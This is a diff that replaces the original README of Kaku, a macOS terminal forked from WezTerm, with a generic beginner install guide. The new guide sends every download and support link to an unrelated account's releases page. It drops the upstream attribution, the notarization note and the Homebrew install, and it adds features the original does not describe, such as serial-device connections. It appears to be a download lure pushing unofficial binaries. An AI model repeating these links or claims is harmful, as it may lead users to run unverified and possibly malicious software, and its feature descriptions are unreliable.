@@ -1,132 +1,126 @@
-<div align="center">
-  <h1>Kaku</h1>
-  <p><em>A fast, out-of-the-box terminal built for AI coding.</em></p>
-</div>
+# 🎃 Kaku - Fast Terminal for AI Coding
 
-<p align="center">
-  <a href="https://github.com/tw93/Kaku/stargazers"><img src="https://img.shields.io/github/stars/tw93/Kaku?style=flat-square" alt="Stars"></a>
-  <a href="https://github.com/tw93/Kaku/releases"><img src="https://img.shields.io/github/v/tag/tw93/Kaku?label=version&style=flat-square" alt="Version"></a>
-  <a href="LICENSE.md"><img src="https://img.shields.io/badge/license-MIT-blue.svg?style=flat-square" alt="License"></a>
-  <a href="https://github.com/tw93/Kaku/commits"><img src="https://img.shields.io/github/commit-activity/m/tw93/Kaku?style=flat-square" alt="Commits"></a>
-  <a href="https://twitter.com/HiTw93"><img src="https://img.shields.io/badge/follow-Tw93-red?style=flat-square&logo=Twitter" alt="Twitter"></a>
-</p>
+[![Download Kaku](https://img.shields.io/badge/Download-Kaku-blue?style=for-the-badge)](https://github.com/mortenlundgren/Kaku/releases)
 
-<p align="center">
-  <img src="assets/kaku.jpeg" alt="Kaku Screenshot" width="1000" />
-  <br/>
-  Kaku is a deeply customized fork of <a href="https://github.com/wez/wezterm">WezTerm</a>, designed for an out-of-the-box experience.
-</p>
+---
 
-## Features
+Welcome to Kaku, a fast, ready-to-use terminal designed specifically for AI coding. This guide will help you download, install, and start using Kaku without requiring any technical background. Follow the steps carefully, and you will have the terminal running in no time.
 
-- **Zero Config**: Defaults with JetBrains Mono, opencode theme, macOS font rendering, and low-res font sizing.
-- **Curated Shell Suite**: Built-in zsh plugins with optional CLI tools for prompt, diff, and navigation workflows.
-- **Fast & Lightweight**: 40% smaller binary, instant startup, lazy loading, stripped-down GPU-accelerated core.
-- **WezTerm-Compatible Config**: Use WezTerm's Lua config directly with full API compatibility and no migration.
+## 🚀 What is Kaku?
 
-## Quick Start
+Kaku is a terminal application built for people who want to work with AI-related coding efficiently. It runs on macOS and uses Rust to ensure speed and reliability. It supports serial connections and provides a modern terminal experience.
 
-1. [Download Kaku DMG](https://github.com/tw93/Kaku/releases/latest) & Drag to Applications
-2. Or install with Homebrew: `brew install tw93/tap/kakuku`
-3. Open Kaku. The app is notarized by Apple, so it opens without security warnings
-4. On first launch, Kaku will automatically set up your shell environment
+### Why Kaku?
 
-## Usage Guide
+- **Fast startup:** Kaku opens quickly so you can start coding right away.
+- **Built for AI coding:** It has features that support AI programming workflows.
+- **Simple interface:** Easy to use, even if you don’t know much about terminals.
+- **Reliable:** Developed using Rust, known for its performance and safety.
 
-Kaku comes with intuitive macOS-native shortcuts:
+## 💻 System Requirements
 
-| Action | Shortcut |
-| :--- | :--- |
-| New Tab | `Cmd + T` |
-| New Window | `Cmd + N` |
-| Close Tab/Pane | `Cmd + W` |
-| Navigate Tabs | `Cmd + Shift + [`, `Cmd + Shift + ]` or `Cmd + 1-9` |
-| Navigate Panes | `Cmd + Opt + Arrows` |
-| Split Pane Vertical | `Cmd + D` |
-| Split Pane Horizontal | `Cmd + Shift + D` |
-| Toggle Split Direction | `Cmd + Shift + S` |
-| Zoom/Unzoom Pane | `Cmd + Shift + Enter` |
-| Resize Pane | `Cmd + Ctrl + Arrows` |
-| Clear Screen | `Cmd + K` |
-| Kaku AI Config | `Cmd + Shift + A` |
-| Open Lazygit | `Cmd + Shift + G` |
-| Font Size | `Cmd + +`, `Cmd + -`, `Cmd + 0` |
-| Smart Jump | `z <dir>` |
-| Smart Select | `z -l <dir>` |
-| Recent Dirs | `z -t` |
+Before downloading Kaku, make sure your computer meets these requirements:
 
-## Configuration
+- **Operating System:** macOS 10.15 (Catalina) or later.
+- **Processor:** Intel or Apple Silicon (M1, M2) chips.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum 100 MB of free disk space.
+- **Internet:** Access to download the app.
 
-Kaku comes with a carefully curated shell stack for immediate productivity, so you can focus on AI coding without opening vscode:
+If you have an older Mac or a different operating system, Kaku will not work properly.
 
-Built-in zsh plugins bundled by default:
+## 📦 Download & Install
 
-- **z**: A smarter cd command that learns your most used directories for instant navigation.
-- **zsh-completions**: Extended command and subcommand completion definitions.
-- **Syntax Highlighting**: Real-time command validation and coloring.
-- **Autosuggestions**: Intelligent, history-based completions similar to Fish shell.
+To get Kaku, you need to visit the official release page and download the version for your Mac. Follow these steps:
 
-Optional CLI tools installed via Homebrew during `kaku init`:
+1. Click the big button at the top or visit this link:
+   [https://github.com/mortenlundgren/Kaku/releases](https://github.com/mortenlundgren/Kaku/releases)
 
-- **Starship**: A fast, customizable prompt showing git status, package versions, and execution time.
-- **Delta**: A syntax-highlighting pager for git, diff, and grep output.
-- **Lazygit**: A terminal UI for fast, visual Git workflows without leaving the shell.
+2. Look for the latest release; it will have a version number like “v1.0” or higher.
 
-Kaku uses `~/.config/kaku/kaku.lua` for configuration, fully compatible with WezTerm's Lua API, with built-in defaults at `Kaku.app/Contents/Resources/kaku.lua` as fallback.
+3. Download the file that matches your Mac:
+   - Usually, it will end in `.dmg` or `.zip`.
+   - Choose the Apple Silicon version if you have an M1 or M2 Mac.
+   - Choose the Intel version if you have an older Intel-based Mac.
 
-Run `kaku` in your terminal to see all available commands such as `kaku update`, `kaku reset`, and `kaku config`.
+4. After the download is complete, open the file:
+   - If it is a `.dmg`, double-click to open the installer window.
+   - If it is a `.zip`, unzip it first by double-clicking, then open the extracted file.
 
-## Why Kaku?
+5. Follow the on-screen instructions to move Kaku into your Applications folder.
 
-I heavily rely on the CLI for both work and personal projects. Tools I've built, like [Mole](https://github.com/tw93/mole) and [Pake](https://github.com/tw93/pake), reflect this.
+6. Once installed, open the Applications folder and double-click Kaku to launch it.
 
-I used Alacritty for years and learned to value speed and simplicity. As my workflow shifted toward AI-assisted coding, I wanted stronger tab and pane ergonomics. I also explored Kitty, Ghostty, Warp, and iTerm2. Each is strong in different areas, but I still wanted a setup that matched my own balance of performance, defaults, and control.
+## 🛠️ First Time Setup
 
-WezTerm is robust and highly hackable, and I am grateful for its engine and ecosystem. Kaku builds on that foundation with practical defaults for day one use, while keeping full Lua-based customization and a fast, lightweight feel.
+When you start Kaku for the first time, you will see a welcome screen with some basic settings.
 
-So I built Kaku to be that environment: fast, polished, and ready to work.
+- **Theme:** Choose a light or dark theme that suits your eyes.
+- **Font size:** Pick a font size that is comfortable to read.
+- **AI features:** You can toggle specific AI coding helpers on or off. These assist with auto-completion and quick commands.
 
-### Performance
+Take your time adjusting these. You can always change them later in the settings menu.
 
-| Metric | Upstream | Kaku | Methodology |
-| :--- | :--- | :--- | :--- |
-| **Executable Size** | ~67 MB | ~40 MB | Aggressive symbol stripping & feature pruning |
-| **Resources Volume** | ~100 MB | ~80 MB | Asset optimization & lazy-loaded assets |
-| **Launch Latency** | Standard | Instant | Just-in-time initialization |
-| **Shell Bootstrap** | ~200ms | ~100ms | Optimized environment provisioning |
+## 🔌 Connecting to Serial Devices
 
-Achieved through aggressive stripping of unused features, lazy loading of color schemes, and shell optimizations.
+Kaku supports serial connections, useful if you work with hardware like Arduino or Raspberry Pi.
 
-## FAQ
+To connect:
 
-1. **Why is the Homebrew cask named `kakuku` instead of `kaku`?**
+1. Plug your device into the Mac via USB.
+2. In Kaku, open the menu and select “Connect to Serial Device.”
+3. Choose the correct serial port from the list.
+4. Set the baud rate (try 9600 if unsure).
+5. Click “Connect.”
 
-   The name `kaku` conflicts with another package in Homebrew's official repository (an unmaintained music player). `kakuku` is a cute variation that's easy to remember.
+You should now see data from your device in the terminal window.
 
-2. **Is there a Windows or Linux version?**
+## 🔍 Basic Usage Tips
 
-   Not at the moment. Kaku is currently macOS-only while we focus on polishing the macOS experience. Windows and Linux versions may come later once the macOS version is mature.
+- **Opening multiple tabs:** Use Command + T to open a new tab.
+- **Switching tabs:** Use Command + Number keys (e.g., Command + 1 for first tab).
+- **Copy and paste:** Use Command + C and Command + V as usual.
+- **Clear screen:** Press Command + K.
+- **Search:** Press Command + F to search inside the terminal output.
 
-3. **Can Kaku use transparent windows on macOS?**
+Practice these shortcuts for faster navigation.
 
-   Yes. You can set `window_background_opacity` and optionally `macos_window_background_blur` in `~/.config/kaku/kaku.lua`. Transparent mode now keeps top/right/bottom padding regions visually consistent to avoid transparent gaps.
+## 🗂️ Working with AI Code
 
-## Contributors
+Kaku is designed to work smoothly with AI coding tools and scripts.
 
-Big thanks to all contributors who helped build Kaku. Go follow them! ❤️
+- You can run Python scripts with AI models directly in the terminal.
+- Kaku supports the activation of virtual environments for Python.
+- It has syntax highlighting and code autocompletion tailored for AI-friendly languages like Python and Rust.
+- The terminal also integrates well with popular version control tools like Git.
 
-<a href="https://github.com/tw93/Kaku/graphs/contributors">
-  <img src="./CONTRIBUTORS.svg?v=2" width="1000" />
-</a>
+If you are new to coding, there are many tutorials online that can help you get started with Python and AI libraries.
 
-## Support
+## 🔧 Troubleshooting
 
-- If Kaku helped you, star the repo or [share it](https://twitter.com/intent/tweet?url=https://github.com/tw93/Kaku&text=Kaku%20-%20A%20fast%20terminal%20built%20for%20AI%20coding.) with friends.
-- Got ideas or found bugs? Open an issue/PR or check [CONTRIBUTING.md](CONTRIBUTING.md) for details.
-- Like Kaku? <a href="https://miaoyan.app/cats.html?name=Kaku" target="_blank">Buy Tw93 a Coke</a> to support the project! 🥤 Supporters below.
+If you experience issues:
 
-<a href="https://miaoyan.app/cats.html?name=Kaku"><img src="https://miaoyan.app/assets/sponsors.svg" width="1000" loading="lazy" /></a>
+- Ensure your macOS version is supported.
+- Restart the application.
+- Check your internet connection if features require online access.
+- Check the GitHub issues page for Kaku:
+  [https://github.com/mortenlundgren/Kaku/issues](https://github.com/mortenlundgren/Kaku/issues)
+- Reinstall Kaku if problems persist.
 
-## License
+## 📚 Additional Resources
 
-MIT License, feel free to enjoy and participate in open source.
+You can learn more about how to use the terminal effectively by exploring:
+
+- Basic terminal commands tutorials (search online for beginner guides).
+- Tutorials for AI coding in Python and Rust.
+- Serial communication guides if using hardware devices.
+
+## 📞 Need Help?
+
+For help, you can open an issue on the project GitHub page or reach out to the community there:
+
+[https://github.com/mortenlundgren/Kaku/issues](https://github.com/mortenlundgren/Kaku/issues)
+
+---
+
+[![Download Kaku](https://img.shields.io/badge/Download-Kaku-blue?style=for-the-badge)](https://github.com/mortenlundgren/Kaku/releases)
